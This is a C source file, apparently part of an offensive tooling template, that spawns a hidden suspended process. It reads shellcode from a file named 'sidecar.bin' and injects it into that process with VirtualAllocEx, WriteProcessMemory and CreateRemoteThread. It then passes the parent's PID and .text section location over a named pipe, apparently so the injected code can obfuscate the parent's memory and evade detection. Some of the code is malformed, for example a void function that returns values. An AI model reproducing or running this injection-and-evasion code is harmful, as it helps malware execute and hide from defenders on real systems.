#include <stdio.h>

typedef struct {
    void* baseAddress;
    DWORD size;
} TextSectionInfo;


TextSectionInfo GetTextSectionInfo(HMODULE hModule) {
    
    TextSectionInfo info = { 0 };

    BYTE* baseAddr = (BYTE*)hModule;
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddr;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddr + dosHeader->e_lfanew);
    IMAGE_SECTION_HEADER* section = IMAGE_FIRST_SECTION(ntHeaders);

    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i) {
        if (strncmp((char*)section->Name, ".text", 5) == 0) {
            info.baseAddress = baseAddr + section->VirtualAddress;
            info.size = section->Misc.VirtualSize;
            break;
        }
        ++section;
    }

    return info;
}

void memoryobfuscation(){
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    DWORD pid = GetCurrentProcessId();
    HMODULE hModule = GetModuleHandle(NULL);
    if (!hModule) {
        return NULL;
    }
    TextSectionInfo textInfo = GetTextSectionInfo(hModule);

    const char* exeName = "{{PROCESS_SPAWN}}";
    size_t bufferSize = 256;
    char* result = (char*)malloc(bufferSize);
    sprintf_s(result, bufferSize, "\"%s\" %lu 0x%p 0x%lx", exeName, pid, textInfo.baseAddress, textInfo.size);

    const char* pipeName = R"(\\.\pipe\5c8a150ae68b4cbc8b5eeacb0f89b7aa)";
    HANDLE hPipe = CreateNamedPipeA(
        pipeName,
        PIPE_ACCESS_OUTBOUND,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        1,
        0,0,0,
        NULL
    );

    if (!CreateProcessA(
        "{{PROCESS_SPAWN}}",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        return 1;
    }

    FILE* fp;
    fopen_s(&fp, "sidecar.bin", "rb");
    if (!fp) {
        return 1;
    }

    fseek(fp, 0, SEEK_END);
    size_t size = ftell(fp);
    rewind(fp);

    unsigned char* shellcode = (unsigned char*)malloc(size);
    fread(shellcode, 1, size, fp);
    fclose(fp);

    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        return 1;
    }

    if (!WriteProcessMemory(pi.hProcess, remoteMem, shellcode, size, NULL)) {
        return 1;
    }

    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    if (!hThread) {
        return 1;
    }
    ConnectNamedPipe(hPipe, NULL);
    DWORD bytesWritten;
    WriteFile(hPipe, result, (DWORD)strlen(result), &bytesWritten, NULL);

    // Cleanup
    CloseHandle(hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    free(shellcode);
}
